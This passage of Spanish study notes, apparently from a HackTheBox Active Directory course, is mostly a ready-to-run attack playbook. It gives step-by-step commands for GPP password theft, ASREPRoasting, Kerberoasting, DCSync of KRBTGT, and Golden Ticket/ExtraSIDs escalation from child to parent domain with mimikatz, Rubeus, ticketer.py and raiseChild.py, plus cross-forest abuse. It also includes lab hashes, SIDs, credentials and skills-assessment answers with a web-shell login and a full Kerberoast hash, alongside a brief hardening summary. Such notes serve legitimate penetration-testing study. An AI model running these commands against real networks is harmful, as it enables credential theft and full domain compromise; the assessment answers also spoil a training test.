# Buscar contraseñas GPP con CrackMapExec
crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> -M gpp_password

# Buscar autologon GPP
crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> -M gpp_autologin
```

### ASREPRoasting
Es posible obtener el Ticket Granting Ticket (TGT) para cualquier cuenta que tenga habilitada la configuración "Do not require Kerberos pre-authentication". El authentication service reply (AS_REP) está encriptado con la contraseña de la cuenta, y cualquier usuario del dominio puede solicitarlo.

```
# Enumerar usuarios con pre-auth no requerido
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Obtener AS-REP con Rubeus
.\Rubeus.exe asreproast /user:<USERNAME> /nowrap /format:hashcat
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Crackear hash offline con Hashcat
hashcat -m 18200 <HASH_FILE> /usr/share/wordlists/rockyou.txt
```
```
# Enumerar usuarios con Kerbrute
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST> 
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt > valid_ad_users.txt

# Hunting con GetNPUsers.py los usuarios sin pre-auth requerida
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile <USERLIST>
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users.txt
```
**Group Policy Object (GPO) Abuse**
Si podemos obtener derechos sobre un Group Policy Object a través de una mala configuración de ACL, podríamos aprovechar esto para movimiento lateral, escalación de privilegios e incluso compromiso del dominio.

```
# Enumerar nombres de GPO con PowerView
Get-DomainGPO | select displayname

# Con cmdlet built-in
Get-GPO -All | Select DisplayName

# Verificar derechos de Domain Users sobre GPOs
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# Convertir GUID de GPO a nombre
Get-GPO -Guid <GPO_GUID>
```
__________________________________________________________________

# Domain Trusts Primer / Fideicomisos de Dominio / Confianza de Dominio

> Relación de confianza entre dominios/forests que permite autenticación cruzada y acceso a recursos entre dominios. Se usa frecuentemente en fusiones/adquisiciones o integraciones (p. ej. con MSPs, divisiones regionales, subdominios). Si no se considera seguridad al establecerlas, las trusts pueden introducir vectores de ataque (p. ej. dominio confiado débil o vulnerable que permite acceso al dominio principal).

**Impacto**
- Posible acceso indirecto al dominio objetivo a través de un dominio confiado más débil.
- Movimiento lateral, escalación de privilegios o persistencia aprovechando cuentas/servicios en el dominio confiado.
- Ataques tipo “end-around”: no encuentro foothold en el dominio principal, pero lo logro explotando un dominio confiado.

**Tipos de Trust/Confinaza**
- _Parent-child (intra-forest):_ dos vías transitive por defecto entre parent y child.
- _Cross-link:_ trust entre child domains para acelerar autenticación.
- _External:_ trust no transitivo entre dominios en diferentes forests; puede usar SID filtering.
- _Tree-root:_ trust transitive entre forest root y nuevo tree root.
- _Forest:_ trust transitive entre roots de forest.
- _Transitive vs Non-transitive:_ transitive extiende la confianza a subdominios que el child confía; non-transitive sólo confía en el dominio directo.
- _Direction:_ one-way (solo usuarios del dominio confiado acceden a recursos del que confía) o two-way (bidireccional).

### Herramientas y técnicas para enumerar trusts
```
# Enumeracion de relaciones de confianza con herramientas integradas

# Importar módulo AD (entorno con permisos)
Import-Module ActiveDirectory

# Enumerar todas las trusts con Get-ADTrust
Get-ADTrust -Filter *
```
```
#Enumerar usuarios de Trust con PowerView

Import-Module .\PowerView.ps1

# Listar trusts
Get-DomainTrust

# Mapear trusts completos (dirección, tipo, atributos)
Get-DomainTrustMapping
```
```
# Enumerar usuarios en dominio de confianza / child
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

--------------------------
#Desde una maquina Windows Atacante

# Consultar trusts con netdom
netdom query /domain:inlanefreight.local trust

# Consultar domain controllers
netdom query /domain:inlanefreight.local dc

# Consultar workstations/servers
netdom query /domain:inlanefreight.local workstation
```
```
BloodHound

Usar la query preconstruida Map Domain Trusts para visualizar relaciones bidireccionales, forest transitive, etc.

BloodHound ayuda a combinar trusts con rutas de ataque (paths) hacia high-value targets.
```
**Salida**

- _ForestTransitive:_ True → trust de forest (potencialmente más alcance).
- _IntraForest:_ True → parent-child (mirar si child tiene cuentas con privilegios sensibles).
- _Direction:_ BiDirectional → mayor riesgo: autenticación cruzada completa.
- _SelectiveAuthentication:_ False → todos los usuarios del dominio confiado pueden autenticarse en recursos (riesgo mayor).
- _SIDFilteringForestAware/SIDFilteringQuarantined_ → revisar si SID filtering está habilitado (reduce abuso de SIDs).



## Attacking Domain Trusts - Child -> Parent Trusts - from Windows

**Concepto de SIDHistory**

- sidHistory permite mantener acceso tras migraciones de usuarios.
- Un atacante puede inyectar SIDs (ej: Enterprise Admins) en el sidHistory de una cuenta.
- Esto permite crear un Golden Ticket con privilegios de Enterprise Admin desde un dominio hijo comprometido hacia el dominio padre.
  - _Golden Ticket_: Es un ticket de concesión de tickets Kerberos (TGT), que nos permitirá autenticarnos como cualquier cuenta en el dominio de nuestra elección 

**ExtraSIDs Attack**

- Permite escalar de un child domain comprometido al parent domain.
- Funciona si SID Filtering no está habilitado dentro de un mismo bosque.
- Idea: insertar el SID del grupo Enterprise Admins (del dominio raíz) en el ticket de un usuario del child domain.
  - Resultado: el usuario pasa a tener Enterprise Admin rights en todo el bosque.

**Requisitos para el ataque**
> La cuenta KRB (Kerberos) TGT (Ticket Granting Ticket) se utiliza para cifrar/firmar todos los tickets Kerberos otorgados dentro de un dominio determinado.

1. KRBTGT hash del child domain (se obtiene con DCSync) (KRBTGT es una cuenta de servicio).
2. SID del child domain.
3. Usuario objetivo en el child domain (podemos poner cualquiera, ej. hacker).
4. FQDN del child domain.
5 SID del grupo Enterprise Admins del parent domain.

_La cuenta KRBTGT se puede utilizar para crear tickets Kerberos TGT que se pueden utilizar para solicitar tickets TGS para cualquier servicio en cualquier host del dominio. Esto también se conoce como ataque **Golden Ticket**_

```
#Obtener hash KRBTGT (1,4)
cd C:\\Tools\Mimikatz\x64
.\mimikatz
mimikatz # lsadump::dcsync /user:CHILD\krbtgt
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

#Obtener SID (del dominio hijo) (2, 3)
Get-DomainSID    # S-1-5-21-2806153819-209893948-922872689

#Obtener SID de Enterprise Adminis del dominio padre (4, 5)
Get-DomainGroup -Domain DC.local -Identity "Enterprise Admins" | select distinguishedname,objectsid
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

#Comprobar acceso (En este punto: Access Denied)
ls \\academy-ea-dc01.inlanefreight.local\c$
-----

#Crear GOLDEN TICKET con ExtrSIDs
mimikatz # kerberos::golden /user:<USER> /domain:<CHILD_FQDN> /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_EA_SID> /ptt
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
    klist  #Confirmar tickets

#Verificar acceso a Parent Domain
ls \\ParentDC.DC.local\c$
```
```
#Ejecucion con Rubeus

#Crear ticket con privilegios de Enterprise Admin
.\Rubeus.exe golden /rc4:<KRBTGT_hash> /domain:CHILD.DC.local /sid:<ChildSID> /sids:<EnterpriseAdminsSID> /user:hacker /ptt
Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
    klist  #Confirmar tickets
```
```
#Acceso al Dominio Padre (ej. DCSync)

mimikatz # lsadump::dcsync /user:<PARENT_DOMAIN>\<TARGET_USER> /domain:<PARENT_DOMAIN_FQDN>
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

## Attacking Domain Trusts - Child -> Parent Trusts - from Linux

**Requisitos previos**

- Hash KRBTGT del dominio hijo
- SID del dominio hijo
- Usuario objetivo (puede no existir, ej. hacker)
- FQDN del dominio hijo
- SID del grupo Enterprise Admins del dominio padre

```
#Ataque DCSync del KRBTGT (Child Domain) - Osea el comprometido donde tenemos privilegios (En este caso de Replicacion para ejecutar el DCSync)
secretsdump.py <CHILD_FQDN>/<User>@<Child_DC_IP> -just-dc-user <CHILD_NETBIOS>/krbtgt
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt  --> HTB_@cademy_stdnt_admin!
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
    NT hash: 9d765b482771505cbe97411065964d5f

#Obtener SID del dominio hijo
lookupsid.py <CHILD_FQDN>/<User>@<Child_DC_IP>
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240

#Obtener SID del grupo Enterprise Admins del dominio padre
lookupsid.py <CHILD_FQDN>/<User>@<Parent_DC_IP> | grep -B12 "Enterprise Admins"
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

---------

#Crear Golden Ticket
ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD_FQDN> -domain-sid <CHILD_SID> -extra-sid <PARENT_EA_SID> <USER>
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
    Se guarda en hacker.ccache
    Exportar variable kerberos (Para que el sistema use ese ticket cuando se quiera autenticar): export KRB5CCNAME=hacker.ccache

#Acceso al DC del dominio padre
psexec.py <CHILD_FQDN>/<USER>@<PARENT_DC_FQDN> -k -no-pass -target-ip <Parent_DC_IP>
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

--------------------

#Alternativa Automatizada
raiseChild.py -target-exec <Parent_DC_IP> <CHILD_FQDN>/<User>
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
> **_RaiseChild_**
> - Recupera hash de krbtgt (child y parent)
> - Crea Golden Ticket automáticamente
> - Se conecta al DC del dominio padre vía PsExec

`Solucion HTB: secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross`

___________________________________________________________________________________________________________

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
> En trusts entre forests (especialmente bidireccionales), es posible abusar de Kerberos y membresías cruzadas para moverse lateralmente o escalar privilegios.
Los ataques típicos incluyen Kerberoasting cross-forest, reutilización de contraseñas, membresías foráneas y abuso de sidHistory.
- Escalada de privilegios desde un forest comprometido hacia otro forest confiado.
- Acceso administrativo a recursos críticos en ambos dominios si existen cuentas privilegiadas compartidas.
- Persistencia si no se aplica SID filtering.

### Cross-Forest Kerberoasting

> A través de trusts inbound/bidireccionales, se pueden solicitar tickets TGS de cuentas con SPNs en el dominio remoto, incluso cuentas de Domain Admin.

```
# Enumerar cuentas con SPN en el dominio objetivo
Get-DomainUser -SPN -Domain <TARGET_DOMAIN> | select SamAccountName
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# Verificar relaciones de confianza de un usuario especifico a un Dominio Remoto
Get-DomainUser -Domain <TARGET_DOMAIN> -Identity <TARGET_USER> | select SamAccountName,MemberOf
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select SamAccountName,MemberOf

# Kerberoast apuntando al Dominio Remoto
.\Rubeus.exe kerberoast /domain:<TARGET_DOMAIN> /user:<TARGET_USER> /nowrap
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

### Admin Password Reuse & Group Membership

> Si un admin de Domain A reutiliza credenciales en Domain B → compromiso automático (Es comun que los admiistradores usen la misma contraseña en multiples forest)
> También puede existir membresía foránea: un admin de Domain A listado en grupos Administrators de Domain B.

```
# Enumerar membresías foráneas
Get-DomainForeignGroupMember -Domain <TARGET_DOMAIN>
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# Convertir SID a nombre
Convert-SidToName <SID>
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

# Verificar acceso remoto
Enter-PSSession -ComputerName <TARGET_DC_FQDN> -Credential <OTHER_DOMAIN>\<User>
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

### SID History Abuse - Cross Forest
> Cuando usuarios se migran entre forests, se preserva sidHistory para mantener acceso.
> Si SID Filtering no está habilitado, se puede inyectar un SID privilegiado (p. ej. Domain Admins en Forest A) en una cuenta de Forest B.
>     Resultado: el usuario autenticado en Forest B conserva privilegios de Forest A.

```
# Buscar cuentas con sidHistory
Get-DomainUser -Properties sidHistory | Where-Object {$_.sidHistory} | select SamAccountName,sidHistory
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Properties sidHistory | Where-Object {$_.sidHistory} | select SamAccountName,sidHistory

# Revisar trust attributes
Get-ADTrust -Filter * | select Name,SelectiveAuthentication,SIDFilteringForestAware,SIDFilteringQuarantined,Direction
Get-ADTrust -Filter * | select Name,SelectiveAuthentication,SIDFilteringForestAware,SIDFilteringQuarantined,Direction
```

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

### Cross-Forest Kerberoasting
```
# Enumerar cuentas con SPN en dominio remoto (Con credenciales de un usuario)
GetUserSPNs.py -target-domain <TARGET_DOMAIN> <DOMAIN>/<User>
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Solicitar ticket (TGS) de los usuarios con SPN activo
GetUserSPNs.py -request -target-domain <TARGET_DOMAIN> <DOMAIN>/<User>
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
    # Output en formato $krb5tgs$ → crackear con hashcat (mode 13100)
```
### Foreign Group Membership (BloodHound-python)
> Usuarios de un dominio pueden aparecer como miembros en grupos privilegiados de otro forest (bidireccional). Esto se detecta con BloodHound-python.
> Para esto se usa BloodHound para capturar la información de ambos dominios, para luego determinar las coincidencias (Usuarios en ambos dominios)

```
# Configurar /etc/resolv.conf para resolver el DC objetivo
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5

# Ejecutar recolección
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u User -p Password
zip -r ilfreight_bh.zip *.json

# Configurar /etc/resolv.conf para resolver el remoto
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238

bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u User -p Password
zip -r freight_bh.zip *.json

Analysis -> Users with Foreign Domain Group Membership -> Seleccionar el DC origen INLANEFREIGHT.LOCAL
```
> Usar query: Users with Foreign Domain Group Membership.
> Ejemplo: Administrator@INLANEFREIGHT.LOCAL → miembro de Administrators@FREIGHTLOGISTICS.LOCAL.
<img width="1587" height="382" alt="image" src="https://github.com/user-attachments/assets/a4fc4287-83d4-4a38-b53b-b9ec5ac6d7e4" />

________________________________________________________________________


## Hardening Active Directory (Resumen)

**Documentación**

- Inventario de OUs, usuarios, grupos, equipos, GPOs, roles FSMO.
- Relación de trusts y cuentas privilegiadas.
- Auditoría periódica (anual o trimestral).

**People**

- Política fuerte de contraseñas + gestor.
- Rotar cuentas de servicio.
- Sin admin local en PCs → usar LAPS.
- Minimizar Domain/Enterprise Admins.
- Administración por niveles (split-tier).
- Usar Protected Users para admins.
  `Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members`

**Processes**

- Gestión de activos AD + inventarios.
- Alta/baja de cuentas y MFA.
- Baselines de hardening para hosts.
- Limpieza: cuentas obsoletas, OS/servicios legacy.
- Backups probados + plan de recuperación.

**Technology**

- Revisar AD: BloodHound, PingCastle, Grouper.
- No credenciales en description ni SYSVOL.
- Usar gMSA/MSA (evita Kerberoasting).
- Deshabilitar delegación, print spooler y NTLM en DCs.
- Jump hosts endurecidos para DCs.
- ms-DS-MachineAccountQuota=0.
- Habilitar SMB/LDAP signing y SSL en CA.
- Bloquear acceso anónimo (RestrictNullSessAccess=1).
- Pentests regulares.

**Defensas vs. TTPs (MITRE)**

- Recon: controlar info pública, detectar escaneos.
- Poisoning: SMB/LDAP signing, cifrado fuerte.
- Pwd spraying: logs (4624/4648), MFA, lockout.
- Cred. Enum: monitor actividad anómala.
- LOTL: baseline tráfico + AppLocker.
- Kerberoasting: gMSA, password policy fuerte.


## Additional AD Auditing Techniques
> Herramientas adicionales para auditar Active Directory, recolectar evidencia y respaldar hallazgos con reportes claros para clientes.

### AD Explorer (Sysinternals)
> Navegar y editar AD de forma avanzada.
> Guardar snapshots para análisis offline o comparaciones before/after.
    `File → Create Snapshot`

### PingCastle
> Evaluación de postura de seguridad de AD.
> Reportes con puntuación basada en CMMI.
> Mapas de dominio, trusts y delegaciones.
> Incluye escáneres (ej. ACL, spooler, nullsession, zerologon).
```
PingCastle.exe --help
PingCastle.exe           # modo interactivo
PingCastle.exe --server DC.local --user User --password Password
```

### Group3r
> Audita políticas de GPO en busca de configuraciones débiles.
> Debe correrse desde un host unido al dominio.
```
group3r.exe -s
group3r.exe -f results.log
```

### ADRecon
> Recolección masiva de datos de AD (usuarios, SPNs, trusts, GPOs, DNS, etc.).
> Output en HTML + CSV.
```
.\ADRecon.ps1
.\ADRecon.ps1 -GenExcel -ReportDir C:\Tools\ADRecon-Report-20220328092458
```
__________________________________________________________________________


#SOLUCION PRUEBAS

## 1. Submit the contents of the flag.txt file on the administrator Desktop of the web server

Aqui unicamente es seguir los pasos que nos dan:

Ingresar al path con el ReverseShell
<IP>/uploads/antak.aspx

Ingresar con las credenciales proporcionadas
admin:My_W3bsH3ll_P@ssw0rd!

Imprimir por pantalla la flag
type C:\\Users\administrator\flag.txt

## 2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer

Este ya es un poco mas complejo, especialmente porque por alguna razon no pude hacer funcionar la herramienta PowerView, que es la mas util vista en el curso segun mi opinion. En este caso me vi forzado a usar Rubeus.

Para lo cual primero descargue la herramienta en mi Kali `wget https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Rubeus.exe` y luego la cargue en la maquina victima

Luego de cargada simplemente la ejecute en el dominio local, ya que inicialmente me confundi pensando que "" era un SPN y se debia llamar como tal "/spn:":

```
C:\Rubeus.exe kerberoast /domain:inlanefreight.local /nowrap
```
Obteniendo esto para el usuario o SPN especificado
```
[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : MSSQLSvc/SQL01.inlanefreight.local:1433
[*] PwdLastSet             : 3/30/2022 2:14:52 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433@inlanefreight.local*$5603EF8A4792852E8BACD28F223D4E1F$2FC40E4EE5CC692749B3B8033681D3CD813192C1A25D55305B4A4D9EA7FF2FA6CF3263E09B3F9B774F959488E63C16F494DA0769590CBA84D597CBFD531C2EF9BCEF865552655EB675948CC97A1C12C5A7D9B5FD21176F35FF70EEF9AE0A4D587B4EEDA5F34F44DEE7FB7AFCA8634B465B73ADE8CE38DECE1D1FF219DE6306445C656EF5A31164C25EFF66748782A10A78BE7FE5E80B6A9548CCB4FF7ABC6527DB16A2D30DE6E4FD3A59D3A4FF73FD950DC4BE597108679183028457C8FC54A056424A7A595B02E71AE6E3BD60599F6E69226E477A39AD9BA1201682CE9FBFEB624C916BF8D8AD39E477236E2C26ECB851549DD5B4E0639528E42C476C01D7122DED7C5FB8B52A1A0DA205D67C9810D04FB1EDFABB335D755FBC150A2C31B8BCA053ACDDECF3DDF40F755AC38B3BE9AA6A97EF86AED1978B64844956E6C181A62C12809F1F4D60E82AE3E1875AC7DB078FEF13141A0C700AB88BDA5119362A9B01613B76B9562715BDAD306A87E88762F5777404E4776432057CCD3E887E762A34F8FE14335BD242662BBE2898963DAEF52730E6B91FBD0E00408733937B3C1E7BE5B9AECC5CF79BD52DE482ED8DD130D645FD6A3285F5EBB9A6BEBEB40BD21D00C0916EE4670CE8A429F615D54773BA250840DB4D3F8CEBC9A05E337A8DE43C0A961A0DD83CEEF6BF6BB41D3AA1B2BA93C095DCF4EFC3F96815FB5C8539F3CF39DD4C8054BFAB843E4714ABDAD11ED9D28EA242D8B47EA0AD90C9C9E3905675C52DFBE7BB53A9C3C580C2A2975AE66E86DEDD9BDE3D38221AC46E8A7196E5678C020A8168DB9367243D6D0334DE392C37E22691A0D06DED1F8A836C82ED358CE4D1C94F76E8FE111F36819AC0F91955D004BE8FA6883553E27A0E78EFD95CA25300EFEDE73AFD2E6E494B15CF90E64640EB51A9D498FF707413CC838592EDD106CDE66579FF0A6C121BA4B48E62DEAB63C05D9D8776C973F762D15553E870DC6C6FFF1EDC0A39220BC0191BAFD1F0C3667C7F12AC90E97A5D7F261BE9B07FD72057AA305C607627CDEC15FD32945F958AD56B942125C80EF5C1BEB2DD10B150C7AF22419C394264124CFC865BCF24198D518D06BFFB7A803436FE3EC1883183FD9FBCCF63DA68ADFE59FC96EC5BB7A3C4971A7CDA5AEFAAB602A76DB7B05E5CF911EF79447B3EAB235DAAF482DFFB54CB13F09CC71CDE75CABE1A94EEBF48B0A77BFAF5E7E7B0D562DC5A244B7BBF61A3C0706F55F1CA3CB670D87048FC918E669AF58B29824FA883E4D5CEBB1112CDA4F41BA4286C85186769D346F8A90C8D174B3D3459009406459740FA28E157EFAF49D85114B1F112B13113DD4C4510369E80F6A5A8F91A394F1A22C9121D7BA62704A13B0A0A1EEA3C66D34EA00CD1EFBFDC313476187AD78153BF1D7D076206B8F6FE0F07F4BA4E9E0A814C881250FAF9244442F7F6D9C08D6EB7F1C5A01042CC640B4F505F2CAECEF5513284DA2694094A4FD0D7BD40B03D9F15210145232E823A783BD1C776E3
```
> Luego di una revisada por internet y casi todos habian creado una reverse shell con msfvenom y luego usarla a traves del /multi/handler de msfconsole para crear una shell y con "-Uri" descargar el PowerView y ejecutar luego el "Get-DomainUser -SPN -Domain <TARGET_DOMAIN> | select SamAccountName".
> Lo cual se me hace bastante peculiar, de que no enseñaban ese proceso en el curso, sino que tambien que todos siguieran esa misma metodologia
> Uno que si vale la pena resaltar pero que tampoco enseñaron es de [HackNotes](https://www.hack-notes.pro/academy-hackthebox/ad-enumeration-and-attacks-skills-assessment-part-i) que uso un comando integrado en Windows para extraer las cuentas SPN
```
setspn.exe -Q */*

CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL01.inlanefreight.local:1433
```




















